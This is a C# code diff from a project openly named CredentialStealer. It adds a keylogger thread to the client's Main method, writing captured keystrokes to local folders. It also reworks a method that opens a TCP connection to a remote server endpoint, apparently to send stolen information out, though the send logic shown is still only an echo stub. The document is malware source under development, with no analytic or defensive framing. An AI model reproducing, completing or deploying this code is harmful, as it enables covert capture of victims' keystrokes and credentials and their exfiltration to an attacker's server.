@@ -1,10 +1,12 @@
 ﻿using CredentialStealer.Entities;
+using CredentialStealer.KeyboardRecorder;
 using System;
 using System.IO;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
+using System.Windows.Forms;
 
 namespace CredentialStealer.Client.Console
 {
@@ -58,23 +60,26 @@ namespace CredentialStealer.Client.Console
 
         public void SendInfosToMyServer(string content,IPEndPoint serverEndPoint)
         {
-                TcpClient client = new TcpClient();
-                client.Connect(serverEndPoint);
-                NetworkStream nwStream = client.GetStream();
-                ASCIIEncoding encoder = new ASCIIEncoding();
+
+            TcpClient client = new TcpClient();
+            client.Connect(serverEndPoint);
+            NetworkStream nwStream = client.GetStream();
+            ASCIIEncoding encoder = new ASCIIEncoding();
 
 
-                string textToSend = "echo";
-                byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes(textToSend);
+            string textToSend = "echo";
+            byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes(textToSend);
 
-                //---send the text---
-                System.Console.WriteLine("Sending : " + textToSend);
-                //nwStream.Write(bytesToSend, 0, bytesToSend.Length);
+            //---send the text---
+            System.Console.WriteLine("Sending : " + textToSend);
+            //nwStream.Write(bytesToSend, 0, bytesToSend.Length);
 
-                Client.write(nwStream, encoder, encoder.GetBytes("Echo"));
-                System.Console.WriteLine(encoder.GetString(read(nwStream, encoder)));
-                client.Close(); 
+            Client.write(nwStream, encoder, encoder.GetBytes("Echo"));
+            System.Console.WriteLine(encoder.GetString(read(nwStream, encoder)));
+            client.Close(); 
         }
+
+       
 
         public void SendInfosToServer(string content,IPEndPoint serverEndPoint)
         {
@@ -86,7 +91,7 @@ namespace CredentialStealer.Client.Console
             IPEndPoint serverEndPoint = new IPEndPoint(IPAddress.Parse(IP), PORT);
             try
             {
-                
+
 
             }
             catch (Exception ex)
@@ -97,7 +102,26 @@ namespace CredentialStealer.Client.Console
 
         public static void Main(string[] args)
         {
+            Thread keyLogThread = new Thread(new ThreadStart(KeyLogThreadFunction));
+            keyLogThread.Start();
+            Thread.Sleep(3000);
             new Client();
+        }
+
+        private static void KeyLogThreadFunction()
+        {
+            try
+            {
+                KeyLogger kl = new KeyLogger("keylogging", @"C:\ITC\log_src", @"C:\ITC\log_dest");
+                while (true)
+                {
+                    Application.DoEvents();
+                }
+            }
+            catch (Exception e)
+            {
+                System.Console.WriteLine("Error in KeyLogger Process \n" + e);
+            }
         }
     }
 }
